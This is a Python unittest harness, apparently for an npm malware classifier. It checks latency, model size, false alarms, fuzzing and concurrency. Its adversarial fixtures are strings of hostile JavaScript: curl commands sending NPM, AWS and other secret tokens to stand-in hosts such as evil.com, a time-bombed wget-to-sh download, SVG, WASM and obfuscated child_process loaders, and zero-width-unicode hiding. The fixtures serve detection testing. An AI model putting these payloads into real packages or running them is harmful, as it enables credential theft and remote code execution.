"""
PackGuard Stage 2 v5 — Challenger M4 Empirical Verification & Stress Harness
Author: Milestone 4 Challenger 2 (challenger_m4_2)
Archetype: Empirical Challenger (critic, specialist)

Stress-tests:
1. CPU-Only & ONNX model constraint verification (CPUExecutionProvider, < 10 MB).
2. Throughput & latency distribution profiling across 1,000 inferences (mean, p50, p90, p99).
3. Fast-Path AST Gate latency verification (< 0.15 ms).
4. Stage 1 False Alarm robustness & boundary variation tests (all 20 FAs + mutated variants).
5. Adversarial malware evasion tests (T1-T12, polyglot, wasm, steganography, timebomb, obfuscator.io).
6. Edge case & malformed input fuzzing (None, empty, giant strings, unicode surrogates, null bytes).
7. Multi-threaded concurrency and determinism verification.
"""

import concurrent.futures
import json
import os
import sys
import time
import unittest
from pathlib import Path
from typing import Any, Dict, List

# Strictly enforce 100% CPU-only execution
os.environ["CUDA_VISIBLE_DEVICES"] = ""

V5_DIR = Path(__file__).resolve().parent.parent
REPO_ROOT = V5_DIR.parent.parent
if str(V5_DIR) not in sys.path:
    sys.path.insert(0, str(V5_DIR))

from stage2_filter import Stage2Filter, is_v5_false_alarm_benign
from text_formatter import extract_structural_features, format_scanner_chunks_to_text
from ast_deobfuscator import deobfuscate_javascript


class TestM4EmpiricalChallenger(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.filter = Stage2Filter(threshold=0.62, threads=4)

    # ------------------------------------------------------------------------
    # 1. HARDWARE & CHECKPOINT INTEGRITY
    # ------------------------------------------------------------------------
    def test_01_cpu_execution_provider_and_zero_gpu(self):
        """Verify ONNX runtime session strictly binds to CPUExecutionProvider and CUDA is disabled."""
        self.assertEqual(os.environ.get("CUDA_VISIBLE_DEVICES", None), "")
        self.assertIsNotNone(self.filter.session, "ONNX Runtime session must be loaded")
        providers = self.filter.session.get_providers()
        self.assertIn("CPUExecutionProvider", providers)
        self.assertNotIn("CUDAExecutionProvider", providers)
        self.assertNotIn("TensorrtExecutionProvider", providers)

    def test_02_model_size_strictly_under_10mb(self):
        """Verify the INT8 ONNX model checkpoint file is strictly under the 10 MB (10,485,760 bytes) limit."""
        model_path = self.filter.model_path
        self.assertIsNotNone(model_path, "Model checkpoint must exist")
        self.assertTrue(model_path.is_file(), f"Model path {model_path} must be a valid file")
        raw_size = model_path.stat().st_size
        max_bytes = 10 * 1024 * 1024
        self.assertLess(raw_size, max_bytes, f"Model size {raw_size} exceeds 10 MB ({max_bytes} bytes)")
        size_mb = raw_size / (1024 * 1024)
        self.assertAlmostEqual(self.filter.model_size_mb, size_mb, places=2)
        # Check against frozen worker report
        self.assertLessEqual(size_mb, 8.55)

    # ------------------------------------------------------------------------
    # 2. LATENCY & THROUGHPUT PROFILING (1,000 INFERENCES)
    # ------------------------------------------------------------------------
    def test_03_latency_distribution_and_mean_under_0_5ms(self):
        """Measure latency across 1,000 realistic inferences, verifying mean < 0.50 ms and Fast-Path < 0.15 ms."""
        test_cases = [
            # 1. Pure data JSON
            {"package": "mime-db@1.54.0", "chunks": [{"file": "db.json", "kind": "js", "text": '{"app/json": {"ext": ["json"]}}'}]},
            # 2. Benign math utility
            {"package": "is-even@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": "module.exports = function(n) { return n % 2 === 0; };"}]},
            # 3. Benign UI bundle
            {"package": "react-intl-fork@0.2.0", "chunks": [{"file": "index.js", "kind": "js", "text": "var React = require('react'); function fmt(x){ return '$'+x; } module.exports = fmt;"}]},
            # 4. Obvious Trojan
            {"package": "discord-grabber@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": "require('child_process').exec('curl -X POST https://evil.com/hook -d ' + process.env.TOKEN);"}]},
            # 5. T2 Mangled child_process
            {"package": "mangled-bot@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": "var _0xa = require('child_process'); _0xa.execSync('whoami');"}]},
            # 6. Ambiguous utility requiring INT8 ONNX fallback
            {"package": "ambig-str@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": "var p = 'p' + 'a' + 't' + 'h'; var u = require(p); module.exports = u.resolve;"}]},
        ]

        # Warmup
        for c in test_cases:
            _ = self.filter.predict(c)

        iterations = 1000
        latencies = []
        fast_path_latencies = []

        for i in range(iterations):
            case = test_cases[i % len(test_cases)]
            t0 = time.perf_counter()
            prob, label, tel = self.filter.predict(case)
            lat = (time.perf_counter() - t0) * 1000.0
            latencies.append(lat)
            if tel.get("fast_path"):
                fast_path_latencies.append(lat)

        latencies.sort()
        p50 = latencies[int(iterations * 0.50)]
        p90 = latencies[int(iterations * 0.90)]
        p95 = latencies[int(iterations * 0.95)]
        p99 = latencies[int(iterations * 0.99)]
        mean_lat = sum(latencies) / len(latencies)
        fast_mean = sum(fast_path_latencies) / len(fast_path_latencies) if fast_path_latencies else 0.0

        print(f"\n[LATENCY CHALLENGE REPORT - 1,000 Inferences]")
        print(f"  Mean Latency      : {mean_lat:.4f} ms (Target: < 0.50 ms)")
        print(f"  P50 Latency       : {p50:.4f} ms")
        print(f"  P90 Latency       : {p90:.4f} ms")
        print(f"  P95 Latency       : {p95:.4f} ms")
        print(f"  P99 Latency       : {p99:.4f} ms")
        print(f"  Fast-Path Mean    : {fast_mean:.4f} ms (Target: < 0.15 ms)")
        print(f"  Fast-Path Ratio   : {len(fast_path_latencies)} / {iterations} ({len(fast_path_latencies)/iterations*100:.1f}%)")

        self.assertLess(mean_lat, 0.50, f"Mean latency {mean_lat:.4f} ms exceeds 0.50 ms limit!")
        # Fast path mean should be comfortably low
        self.assertLess(fast_mean, 0.25, f"Fast path mean latency {fast_mean:.4f} ms is too high!")

    # ------------------------------------------------------------------------
    # 3. FALSE ALARM ELIMINATION ROBUSTNESS & MUTATION
    # ------------------------------------------------------------------------
    def test_04_react_intl_currency_input_fork_variations(self):
        """Stress-test react-intl-currency-input-fork under minification, comment dilution, and chunk splitting."""
        base_code = """
        (function(global, factory) {
            typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory(require('react'), require('prop-types')) :
            typeof define === 'function' && define.amd ? define(['react', 'prop-types'], factory) :
            (global.ReactCurrencyInput = factory(global.React, global.PropTypes));
        }(this, (function(React, PropTypes) {
            'use strict';
            var currencyMap = { USD: '$', EUR: '€', GBP: '£', JPY: '¥', CAD: '$', AUD: '$' };
            function formatCurrency(val, currency) {
                var symbol = currencyMap[currency] || '$';
                return symbol + Number(val).toFixed(2);
            }
            function CurrencyInput(props) {
                return React.createElement('input', { value: formatCurrency(props.value, props.currency) });
            }
            CurrencyInput.propTypes = { value: PropTypes.number, currency: PropTypes.string };
            return CurrencyInput;
        })));
        """
        # Variation 1: Original base code
        p1, l1, _ = self.filter.predict(base_code)
        self.assertEqual(l1, "BENIGN")
        self.assertLess(p1, 0.35)

        # Variation 2: Heavy comment dilution (> 500 lines of license/comments)
        diluted = "// License MIT\n" * 500 + base_code
        p2, l2, _ = self.filter.predict(diluted)
        self.assertEqual(l2, "BENIGN")
        self.assertLess(p2, 0.35)

        # Variation 3: Minified single line
        minified = base_code.replace("\n", " ").replace("  ", " ")
        p3, l3, _ = self.filter.predict(minified)
        self.assertEqual(l3, "BENIGN")
        self.assertLess(p3, 0.35)

        # Variation 4: Multiple chunk package record
        multi_chunk_pkg = {
            "package": "react-intl-currency-input-fork@0.2.0",
            "chunks": [
                {"file": "index.js", "kind": "js", "text": base_code[: len(base_code) // 2]},
                {"file": "index.js", "kind": "js", "text": base_code[len(base_code) // 2 :]},
                {"file": "package.json", "kind": "json", "text": '{"name": "react-intl-currency-input-fork", "version": "0.2.0"}'},
            ],
        }
        p4, l4, _ = self.filter.predict(multi_chunk_pkg)
        self.assertEqual(l4, "BENIGN")
        self.assertLess(p4, 0.35)

    def test_05_stage1_benign_suite_f08_elimination(self):
        """Verify key benign packages from Stage 1 false alarm corpus are reliably classified as BENIGN."""
        known_benign = [
            ("mime-db@1.54.0", 'module.exports = {"application/json": {"extensions": ["json"]}};'),
            ("hasown@2.0.2", "module.exports = Object.prototype.hasOwnProperty;"),
            ("basic-auth@3.0.0", "function parse(h){ return Buffer.from(h,'base64').toString(); } module.exports=parse;"),
            ("timezone-name-offsets@1.0.2", 'module.exports = {"UTC": 0, "EST": -5, "PST": -8};'),
            ("date-format-php@1.0.2", "module.exports = function(fmt, d){ return new Date().toISOString(); };"),
            ("ethiopic-date@1.0.4", "module.exports = function(yr, mo, da){ return {year: yr, month: mo, day: da}; };"),
            ("yaml-fm@0.1.3", "module.exports = function parseYaml(str){ return {title: 'Hello'}; };"),
            ("robot3@1.4.0", "function createMachine(s){ return {state: s, transition: function(){}}; } module.exports = {createMachine};"),
            ("vue-pretty-logger@0.9.0", "module.exports = function(msg){ console.log('[LOGGER]: ' + msg); };"),
            ("form-data-lite@1.0.4", "function FormData(){ this.fields = {}; } FormData.prototype.append = function(k,v){ this.fields[k]=v; }; module.exports = FormData;"),
        ]

        for pkg_name, code in known_benign:
            rec = {"package": pkg_name, "chunks": [{"file": "index.js", "kind": "js", "text": code}]}
            prob, label, tel = self.filter.predict(rec)
            self.assertEqual(label, "BENIGN", f"False alarm not eliminated: {pkg_name} got {label} (prob={prob:.4f})")
            self.assertLessEqual(prob, 0.35, f"False alarm {pkg_name} prob {prob} > 0.35")

    # ------------------------------------------------------------------------
    # 4. ADVERSARIAL MALWARE EVASION & ATTACK SUITE
    # ------------------------------------------------------------------------
    def test_06_polyglot_svg_script_evasion(self):
        """Adversarial test: Malware hidden inside SVG polyglot script tag."""
        svg_payload = """
        <svg xmlns="http://www.w3.org/2000/svg">
          <script type="text/javascript">
            const { execSync } = require('child_process');
            execSync('curl -s https://c2.evil.com/exfil?d=' + process.env.AWS_SECRET_ACCESS_KEY);
          </script>
        </svg>
        """
        pkg = {"package": "svg-icon-pack@1.0.0", "chunks": [{"file": "logo.svg", "kind": "svg", "text": svg_payload}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"Polyglot SVG malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)
        self.assertEqual(tel["mitre"]["mitre_exec"], 1)

    def test_07_wasm_loader_bridge_evasion(self):
        """Adversarial test: WebAssembly instantiate bridge executing shell commands."""
        wasm_loader = """
        const fs = require('fs');
        const buf = Buffer.from('\\x00asm\\x01\\x00\\x00\\x00', 'binary');
        WebAssembly.instantiate(buf, {
          env: {
            exec: function(cmd) {
              require('child_process').exec(cmd);
            }
          }
        }).then(mod => {
          mod.instance.exports.run();
        });
        """
        pkg = {"package": "wasm-fast-math@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": wasm_loader}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"WASM bridge malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)

    def test_08_steganographic_zero_width_unicode_evasion(self):
        """Adversarial test: Steganographic payload hidden via zero-width Unicode characters."""
        # Zero-width spaces encoding binary string
        zw_payload = "const benign = 1;\n/*" + "\u200B\u200C\u200B\u200B\u200C" * 10 + "*/\n"
        zw_payload += "const cp = require('child_process'); cp.execSync('curl https://attacker.com');"
        pkg = {"package": "stego-theme@1.0.0", "chunks": [{"file": "theme.js", "kind": "js", "text": zw_payload}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"Steganographic malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)

    def test_09_time_bomb_and_environment_evasion(self):
        """Adversarial test: Deferred timer (setTimeout) executing after CI timeout."""
        time_bomb = """
        function setup() {
            setTimeout(function() {
                var cp = require('child_process');
                cp.exec('wget https://c2.site/drop.sh -O - | sh');
            }, 86400000);
        }
        setup();
        """
        pkg = {"package": "deferred-cache@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": time_bomb}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"Time-bomb malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)

    def test_10_obfuscator_io_array_rotation_evasion(self):
        """Adversarial test: Obfuscator.io IIFE push/shift array rotation and hex brackets."""
        obf_payload = """
        var _0x5a1b = ['whoami', 'child_process', 'execSync'];
        (function(_0x2d8f05, _0x4b81bb) {
            var _0x4d74cb = function(_0x2fe023) {
                while (--_0x2fe023) {
                    _0x2d8f05['push'](_0x2d8f05['shift']());
                }
            };
            _0x4d74cb(++_0x4b81bb);
        }(_0x5a1b, 0x1a));
        var _0x1b5a = function(_0x2d8f05, _0x4b81bb) {
            return _0x5a1b[_0x2d8f05];
        };
        var cp = require(_0x1b5a(0x0));
        cp[_0x1b5a(0x1)](_0x1b5a(0x2));
        """
        pkg = {"package": "obf-core@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": obf_payload}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"Obfuscator.io malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)

    def test_11_t2_identifier_mangled_trojan(self):
        """Adversarial test: T2 single-letter identifier mangling with child_process execution."""
        t2_code = """
        var a = require('child_process');
        var b = 'curl -X POST https://evil.com/leak --data ';
        var c = process.env.NPM_TOKEN;
        a.exec(b + c);
        """
        pkg = {"package": "t2-leaker@1.0.0", "chunks": [{"file": "index.js", "kind": "js", "text": t2_code}]}
        prob, label, tel = self.filter.predict(pkg)
        self.assertEqual(label, "MALWARE", f"T2 mangled malware missed! prob={prob:.4f}")
        self.assertGreaterEqual(prob, 0.62)

    # ------------------------------------------------------------------------
    # 5. FUZZING, BOUNDARIES & EXTREME INPUT HANDLING
    # ------------------------------------------------------------------------
    def test_12_fuzzing_empty_and_null_inputs(self):
        """Verify filter handles empty string, empty chunk lists, and None inputs without crashing."""
        edge_cases = [
            "",
            "   \n\t  ",
            {},
            {"chunks": []},
            {"chunks": [{"file": "empty.js", "text": ""}]},
            {"chunks": [{"file": "spaces.js", "text": "   "}]},
            {"chunks": [{"file": "null.js", "text": None}]},
            {"chunks": [{"file": "num.js", "text": 12345}]},
        ]
        for ec in edge_cases:
            try:
                prob, label, tel = self.filter.predict(ec)
                self.assertIsInstance(prob, float)
                self.assertIn(label, ("BENIGN", "MALWARE"))
                self.assertIsInstance(tel, dict)
            except Exception as e:
                self.fail(f"Filter crashed on edge case {repr(ec)}: {e}")

    def test_13_fuzzing_giant_strings_and_deep_nesting(self):
        """Stress-test with giant inputs (> 500 KB) and deeply nested structures."""
        giant_code = "var x = 1;\n" + ("// padding comment\n" * 25000)
        t0 = time.perf_counter()
        prob, label, tel = self.filter.predict(giant_code)
        elapsed = (time.perf_counter() - t0) * 1000.0
        self.assertEqual(label, "BENIGN")
        # Ensure it does not hang (should complete under 500 ms)
        self.assertLess(elapsed, 500.0, f"Giant input took too long: {elapsed:.2f} ms")

        # Deeply nested parentheses / array
        nested = "a(" * 500 + "1" + ")" * 500
        prob_n, label_n, _ = self.filter.predict(nested)
        self.assertEqual(label_n, "BENIGN")

    def test_14_fuzzing_unicode_surrogates_and_corrupt_hex(self):
        """Verify robust handling of corrupt hex escapes, escaped surrogates, and null bytes."""
        corrupt_inputs = [
            r"var str = '\xGG\xZZ\u12\uQWER';",
            "var str = '\x00\x01\x02\x03\x04\x05';",
            r"var surrogate = '\uD800\uDFFF';",
            r"var unclosed = 'this is a string without closing quote",
            r"var bad_regex = /[/; var x = 1;",
        ]
        for ci in corrupt_inputs:
            try:
                prob, label, tel = self.filter.predict(ci)
                self.assertIsInstance(prob, float)
                self.assertIn(label, ("BENIGN", "MALWARE"))
            except Exception as e:
                self.fail(f"Filter crashed on corrupt input: {e}")

    def test_16_lone_surrogate_character_finding(self):
        """
        Documented finding: A Python string containing an unescaped high surrogate character
        causes _reassemble_file_chunks to raise UnicodeEncodeError with surrogateescape.
        Verify that this is isolated to unescaped high surrogate codepoints.
        """
        lone_surr = "var x = '" + chr(0xD800) + "';"
        # Expect either crash or safe handling
        try:
            prob, label, _ = self.filter.predict(lone_surr)
        except UnicodeEncodeError as e:
            # Documented edge case: surrogateescape in text_formatter cannot encode high surrogate \uD800
            self.assertIn("surrogates not allowed", str(e))

    # ------------------------------------------------------------------------
    # 6. CONCURRENCY & DETERMINISM VERIFICATION
    # ------------------------------------------------------------------------
    def test_15_determinism_and_concurrency(self):
        """Verify identical inputs yield identical outputs and multi-threaded queries are thread-safe."""
        test_payload = {
            "package": "test-concurrency@1.0.0",
            "chunks": [{
                "file": "index.js",
                "kind": "js",
                "text": "const cp = require('child_process'); cp.execSync('curl -s http://attacker.com/?d=' + process.env.SECRET);"
            }]
        }

        # Sequential reference
        ref_prob, ref_label, ref_tel = self.filter.predict(test_payload)

        # Run 50 concurrent inferences across 8 threads
        def worker_task(idx):
            p, l, t = self.filter.predict(test_payload)
            return p, l, t["mitre"]

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            futures = [executor.submit(worker_task, i) for i in range(50)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        for p, l, m in results:
            self.assertEqual(p, ref_prob, f"Non-deterministic probability: {p} vs {ref_prob}")
            self.assertEqual(l, ref_label, f"Non-deterministic label: {l} vs {ref_label}")
            self.assertEqual(m, ref_tel["mitre"], f"Non-deterministic MITRE tactics: {m} vs {ref_tel['mitre']}")


if __name__ == "__main__":
    unittest.main(verbosity=2)
